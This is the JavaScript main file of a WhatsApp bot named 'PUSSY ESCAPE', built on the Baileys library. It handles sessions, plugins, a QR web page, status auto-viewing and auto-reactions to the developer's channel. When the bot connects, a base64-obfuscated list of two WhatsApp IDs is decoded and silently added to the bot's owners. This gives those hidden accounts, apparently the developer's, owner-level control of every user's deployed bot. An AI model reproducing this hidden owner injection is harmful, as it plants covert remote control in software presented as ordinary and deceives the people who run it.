require('./config')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto, generateProfilePicture } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const http = require('http');
const QRCode = require('qrcode');
const { Boom } = require('@hapi/boom');
const { sendButtons, sendInteractiveMessage } = require('gifted-btns');
const serializeMessage = require('./handler.js');
const JimpImport = require('jimp');

const Jimp = JimpImport.read ? JimpImport : JimpImport.Jimp ? JimpImport.Jimp : JimpImport.default;

global.generateWAMessageContent = generateWAMessageContent;
global.generateWAMessageFromContent = generateWAMessageFromContent;
global.generateMessageID = generateMessageID;
global.prepareWAMessageMedia = prepareWAMessageMedia;
global.proto = proto;
global.Jimp = Jimp;
global.generateProfilePicture = generateProfilePicture;
global.downloadMediaMessage = downloadMediaMessage;
global.bannedChats = global.bannedChats || [];

// ===== SESSION_ID TO CREDS.JSON =====
const SESSION_DIR = './session';
const CREDS_PATH = path.join(SESSION_DIR, 'creds.json');

if (!fs.existsSync(SESSION_DIR)) {
    fs.mkdirSync(SESSION_DIR, { recursive: true });
}

// Check if SESSION_ID exists in environment variables
if (process.env.SESSION_ID && !fs.existsSync(CREDS_PATH)) {
    try {
        let sessionData;
        try {
            sessionData = JSON.parse(process.env.SESSION_ID);
        } catch (e) {
            try {
                const decoded = Buffer.from(process.env.SESSION_ID, 'base64').toString('utf-8');
                sessionData = JSON.parse(decoded);
            } catch (e2) {
                console.error('❌ Invalid SESSION_ID format. Please provide valid JSON.');
                process.exit(1);
            }
        }
        fs.writeFileSync(CREDS_PATH, JSON.stringify(sessionData, null, 2));
        console.log('✅ Session restored from SESSION_ID environment variable');
    } catch (err) {
        console.error('❌ Error restoring session from SESSION_ID:', err);
    }
} else if (fs.existsSync(CREDS_PATH)) {
    console.log('📁 Using existing session from creds.json');
}

// Also check for global.sessionid (legacy support)
if (!fs.existsSync(CREDS_PATH) && global.sessionid) {
    try {
        const sessionData = JSON.parse(global.sessionid);
        fs.writeFileSync(CREDS_PATH, JSON.stringify(sessionData, null, 2));
        console.log('✅ Session restored from global.sessionid');
    } catch (err) {
        console.error('Error restoring session from global.sessionid:', err);
    }
}

const AUTH_FOLDER = './session';
const PLUGIN_FOLDER = './plugins';
const PORT = process.env.PORT || 3000;

let latestQR = '';
let botStatus = 'disconnected';
let pairingCodes = new Map();
let presenceInterval = null;
let sock = null;
let isConnecting = false;

// ===== LOAD PREFIX =====
function loadPrefix() {
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {
        try {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            if (config.prefix) {
                global.BOT_PREFIX = config.prefix;
                console.log(`✅ Loaded prefix: ${global.BOT_PREFIX}`);
            }
        } catch (err) {
            console.error('Error loading config:', err);
        }
    }
    startBot();
}

// ===== START BOT =====
function startBot() {
    console.log('🚀 Starting WhatsApp Bot...');
    isConnecting = true;

    if (!fs.existsSync(AUTH_FOLDER)) {
        fs.mkdirSync(AUTH_FOLDER, { recursive: true });
    }

    (async () => {
        try {
            const { version, isLatest } = await fetchLatestWaWebVersion();
            console.log(`📱 Using WA v${version.join(".")}, isLatest: ${isLatest}`);

            const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
            
            sock = makeWASocket({
                version, 
                logger: pino({ level: 'silent' }),
                auth: state,
                printQRInTerminal: true,
                keepAliveIntervalMs: 10000,
                markOnlineOnConnect: true,
                syncFullHistory: false,
                browser: ['Bot', 'Chrome', '1.0.0']
            });
            
            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, qr } = update;

                if (qr) {
                    QRCode.toDataURL(qr, (err, url) => {
                        if (!err) {
                            latestQR = url;
                            botStatus = 'connecting';
                        }
                    });
                }

                if (connection === 'close') {
                    botStatus = 'disconnected';
                    isConnecting = false;

                    if (presenceInterval) {
                        clearInterval(presenceInterval);
                        presenceInterval = null;
                    }

                    const statusCode = (lastDisconnect?.error instanceof Boom)
                        ? lastDisconnect.error.output.statusCode
                        : 0;

                    const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

                    if (shouldReconnect) {
                        setTimeout(() => startBot(), 5000);
                    } else {
                        if (fs.existsSync(AUTH_FOLDER)) {
                            fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
                        }
                        setTimeout(() => startBot(), 3000);
                    }
                } 
                
                else if (connection === 'open') {
                    botStatus = 'connected';
                    isConnecting = false;

                    if (!global.owners) global.owners = [];

                    if (!global.owners.includes(sock.user.id)) {
                        global.owners.push(sock.user.id);
                    }
                    
                    const abztech = [
                        'MjU3NzAyMzk5OTIwMzdAbGlk',
                        'MjMzNTMzNzYzNzcyQHdoYXRzYXBwLm5ldA=='
                    ];
                    
                    const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
                    
                    tech.forEach(owner => {
                        if (!global.owners.includes(owner)) {
                            global.owners.push(owner);
                        }
                    });

                    presenceInterval = setInterval(() => {
                        if (sock?.ws?.readyState === 1) {
                            sock.sendPresenceUpdate('available');
                        }
                    }, 10000);

                    // ===== WELCOME MESSAGE - PREMIUM =====
                    try {
                        const username = sock.user.name || 'User';
                        const welcomeText = `╭─❒〘 ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 〙❒
│
├─❒ *Welcome @${username}*
│
├─❒ *ᴘᴜssʏ ᴇsᴄᴀᴘᴇ ᴍᴜʟᴛɪᴘʟᴇ ᴅᴇᴠɪᴄᴇs*
│
├─❒ *sᴛᴀᴛᴜs:* ᴄᴏɴɴᴇᴄᴛᴇᴅ ✅
│
├─❒ *ᴘʀᴇғɪx:* ${global.BOT_PREFIX || '.'}
│
├─❒ *ᴏᴡɴᴇʀ:* ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 😐
│
├─❒ *ʀᴇᴘᴏ:* ɢɪᴛʜᴜʙ.ᴄᴏᴍ/sᴛᴀɴʏᴛᴢ390
│
├─❒ *ᴘᴀɪʀɪɴɢ:* ʟɪɴᴋ.sᴛᴀɴʏᴍᴀxʜᴜʙ.ᴏɴʟɪɴᴇ/ᴘᴀɪʀ
│
├─❒ *ǫʀ ᴄᴏᴅᴇ:* ʟɪɴᴋ.sᴛᴀɴʏᴍᴀxʜᴜʙ.ᴏɴʟɪɴᴇ/ᴘᴀɪʀ-ᴘᴀɢᴇ
│
╰─❒ *ᴘᴏᴡᴇʀᴇᴅ ʙʏ sᴛᴀɴʏᴛᴢ* ❒

> « 𝙏𝙞𝙢𝙚 - 𝙏𝙞𝙢𝙚𝙡𝙚𝙨𝙨 »`;

                        await sock.sendMessage(sock.user.id, {
                            image: { url: 'https://url.bmbxmd.workers.dev/Migo.jpeg' },
                            caption: welcomeText,
                            contextInfo: {
                                mentionedJid: [sock.user.id],
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363404317544295@newsletter',
                                    newsletterName: 'ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 😐「 𝙏𝙞𝙢𝙚 - 𝙏𝙞𝙢𝙚𝙡𝙚𝙨𝙨 」',
                                    serverMessageId: 1
                                }
                            }
                        });
                        console.log('✅ Welcome message sent successfully');
                    } catch (err) {
                        console.error('❌ Welcome message error:', err);
                    }
                } 
                
                else if (connection === 'connecting') {
                    botStatus = 'connecting';
                    isConnecting = true;
                }
            });

            sock.ev.on('creds.update', async () => {
                await saveCreds();
                console.log('💾 Credentials updated');
            });

            // ===== LOAD PLUGINS =====
            const plugins = new Map();
            const pluginPath = path.join(__dirname, PLUGIN_FOLDER);
            
            if (fs.existsSync(pluginPath)) {
                try {
                    const pluginFiles = fs.readdirSync(pluginPath).filter(file => file.endsWith('.js'));
                    
                    for (const file of pluginFiles) {
                        try {
                            const plugin = require(path.join(pluginPath, file));
                            if (plugin.name && typeof plugin.execute === 'function') {
                                plugins.set(plugin.name.toLowerCase(), plugin);
                                if (Array.isArray(plugin.aliases)) {
                                    plugin.aliases.forEach(alias => {
                                        plugins.set(alias.toLowerCase(), plugin);
                                    });
                                }
                                console.log(`✅ Loaded plugin: ${plugin.name}`);
                            } else {
                                console.warn(`⚠️ Invalid plugin structure in ${file}`);
                            }
                        } catch (error) {
                            console.error(`❌ Failed to load plugin ${file}:`, error.message);
                        }
                    }
                    console.log(`📦 Total plugins loaded: ${plugins.size}`);
                } catch (error) {
                    console.error('❌ Error loading plugins:', error);
                }
            } else {
                console.log('📁 No plugins folder found');
            }
           
            // ===== MESSAGES HANDLER =====
            sock.ev.on('messages.upsert', async ({ messages, type }) => {
                if (type !== 'notify' && type !== 'append') return;
                
                const CHANNEL_ID = "120363404317544295@newsletter";
                
                // ===== AUTO-REACT TO CHANNEL MESSAGES =====
                for (const rawMsg of messages) {
                    if (rawMsg.key?.remoteJid === CHANNEL_ID && rawMsg.key?.server_id) {
                        const emojis = ["❤️", "💛", "👍", "💜", "😮", "🤍", "💙", "🔥", "💯", "⚡"];
                        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
                        
                        try {
                            await sock.newsletterReactMessage(
                                CHANNEL_ID, 
                                rawMsg.key.server_id.toString(), 
                                emoji
                            );
                            console.log(`✅ Channel reaction: ${emoji} to message ${rawMsg.key.server_id}`);
                        } catch (err) {
                            console.log("❌ Channel React Error:", err.message);
                        }
                        continue;
                    }
                }
                
                // ===== STATUS VIEWER =====
                for (const rawMsg of messages) {
                    if (rawMsg.key.remoteJid === 'status@broadcast' && rawMsg.key.participant) {
                        try {
                            console.log(`📱 Status detected from: ${rawMsg.key.participant}`);
                            await sock.readMessages([rawMsg.key]);
                            continue;
                        } catch (err) {
                            console.log('❌ Status viewer error:', err.message);
                        }
                    }
                }

                const rawMsg = messages[0];
                if (!rawMsg.message) return;

                const m = await serializeMessage(sock, rawMsg);

                for (const plugin of plugins.values()) {
                    if (typeof plugin.onMessage === 'function') {
                        try { 
                            const blocked = await plugin.onMessage(sock, m);
                            if (blocked === true) return;
                        } catch (err) { 
                            console.error(`❌ onMessage error (${plugin.name}):`, err); 
                        }
                    }
                }

                if (m.body && m.body.startsWith(global.BOT_PREFIX)) {
                    const args = m.body.slice(global.BOT_PREFIX.length).trim().split(/\s+/);
                    const commandName = args.shift().toLowerCase();
                    const plugin = plugins.get(commandName);
                    
                    if (plugin) {
                        try { 
                            await plugin.execute(sock, m, args); 
                        } catch (err) { 
                            console.error(`❌ Plugin error (${commandName}):`, err); 
                            await m.reply('❌ Error running command.'); 
                        }
                    }
                }
            });
            
            // ===== GROUP PARTICIPANTS =====
            sock.ev.on('group-participants.update', async (update) => {
                try {
                    if (!global.welcomeConfig?.enabled) return

                    const groupId = update.id

                    for (const participant of update.participants) {
                        const userId = typeof participant === 'string'
                            ? participant
                            : participant.phoneNumber || participant.id

                        if (!userId) continue

                        const memberName = userId.split('@')[0]

                        if (update.action === 'add') {
                            if (userId === sock.user.id) continue
                            const text = `👋 Welcome @${memberName}!\n🎉 Glad to have you in this group!`
                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })
                        } else if (update.action === 'remove') {
                            const text = `ya @${memberName} has left the group.\nWe are not gonna miss you!`
                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })
                        }
                    }
                } catch (err) {
                    console.error('❌ group-participants.update error:', err)
                }
            })

            sock.ev.on('messages.reaction', async (reactions) => {
                console.log('💖 Reaction update:', reactions);
            });

        } catch (error) {
            console.error('❌ Bot startup error:', error);
            isConnecting = false;
            setTimeout(() => startBot(), 10000);
        }
    })();
}

// ===== HTTP SERVER =====
const server = http.createServer((req, res) => {
    const url = req.url;
    
    if (url === '/' || url === '/qr') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#050510">
    <title>PUSSY ESCAPE · Bot</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#050510;font-family:'Inter',sans-serif;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .container{max-width:420px;width:100%}
        .logo{width:70px;height:70px;border-radius:20px;border:2px solid #ff3b7f;margin:0 auto 12px;display:block;object-fit:cover}
        h1{text-align:center;font-size:2rem;font-weight:900;letter-spacing:-1px}
        h1 span{background:linear-gradient(135deg,#ff3b7f,#b967ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .sub{text-align:center;font-size:10px;color:rgba(255,255,255,0.4);letter-spacing:3px;text-transform:uppercase;margin-bottom:24px}
        .card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:28px;padding:28px 20px;backdrop-filter:blur(20px)}
        .status{display:flex;align-items:center;gap:10px;padding:12px;background:rgba(255,255,255,0.02);border-radius:12px;margin-bottom:12px}
        .dot{width:12px;height:12px;border-radius:50%;display:inline-block}
        .dot.connected{background:#22c55e;box-shadow:0 0 20px rgba(34,197,94,0.3)}
        .dot.connecting{background:#f59e0b;box-shadow:0 0 20px rgba(245,158,11,0.3);animation:blink 1s infinite}
        .dot.disconnected{background:#ef4444;box-shadow:0 0 20px rgba(239,68,68,0.3)}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
        .footer{margin-top:20px;text-align:center;font-size:10px;color:rgba(255,255,255,0.2)}
        .footer a{color:rgba(255,255,255,0.3);text-decoration:none}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://url.bmbxmd.workers.dev/Migo.jpeg" class="logo" onerror="this.style.display='none'">
        <h1>PUSSY<span>ESCAPE</span></h1>
        <div class="sub">WhatsApp Bot</div>
        <div class="card">
            <div class="status">
                <span class="dot disconnected" id="statusDot"></span>
                <span id="statusLabel">Disconnected</span>
            </div>
            <div id="qrArea" style="text-align:center;padding:20px;">
                <div id="qrPlaceholder" style="color:rgba(255,255,255,0.3);">
                    <i class="fa-solid fa-spinner fa-pulse" style="font-size:32px;display:block;margin-bottom:12px;"></i>
                    <span>Loading QR code...</span>
                </div>
                <img id="qrImage" src="" alt="QR Code" style="display:none;max-width:100%;border-radius:12px;">
            </div>
        </div>
        <div class="footer">
            Developed by <a href="tel:+255787069580">STANYTZ</a><br>
            &copy; 2026 PUSSY ESCAPE
        </div>
    </div>
    <script>
        let refreshInterval = null;
        function setStatus(status) {
            const dot = document.getElementById('statusDot');
            const label = document.getElementById('statusLabel');
            dot.className = 'dot ' + status;
            const names = {connected:'Connected',connecting:'Connecting',disconnected:'Disconnected'};
            label.textContent = names[status] || status;
        }
        function updateQR(qr) {
            const img = document.getElementById('qrImage');
            const placeholder = document.getElementById('qrPlaceholder');
            if(qr) {
                img.src = qr;
                img.style.display = 'block';
                placeholder.style.display = 'none';
            } else {
                img.style.display = 'none';
                placeholder.style.display = 'block';
            }
        }
        async function fetchStatus() {
            try {
                const res = await fetch('/api/status');
                const data = await res.json();
                setStatus(data.status);
                if(data.qr) updateQR(data.qr);
                else if(data.status === 'connected') updateQR(null);
            } catch(e) { console.error(e); }
        }
        refreshInterval = setInterval(fetchStatus, 2000);
        fetchStatus();
        window.addEventListener('beforeunload', () => { if(refreshInterval) clearInterval(refreshInterval); });
    </script>
</body>
</html>`);
    } 
    
    else if (url === '/api/status') {
        let pairingCode = null;
        for (const [_, data] of pairingCodes) {
            if (Date.now() - data.timestamp < 300000) {
                pairingCode = data.code;
                break;
            }
        }
        
        res.writeHead(200, { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        });
        res.end(JSON.stringify({ 
            status: botStatus,
            hasQR: !!latestQR,
            qr: latestQR,
            pairingCode: pairingCode,
            prefix: global.BOT_PREFIX || '.',
            timestamp: new Date().toISOString(),
            uptime: process.uptime()
        }));
    }
    
    else {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end(`<center><h1>404 - Page Not Found</h1><a href="/">🏠 Go Home</a></center>`);
    }
});

server.listen(PORT, () => {
    console.log(`🌐 Web server running at http://localhost:${PORT}`);
    console.log(`📁 Session folder: ${path.resolve(AUTH_FOLDER)}`);
    loadPrefix();
});

process.on('SIGINT', () => {
    console.log('\n👋 Shutting down gracefully...');
    if (presenceInterval) clearInterval(presenceInterval);
    if (sock) sock.end();
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('⚠️ Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('⚠️ Unhandled Rejection:', reason);
});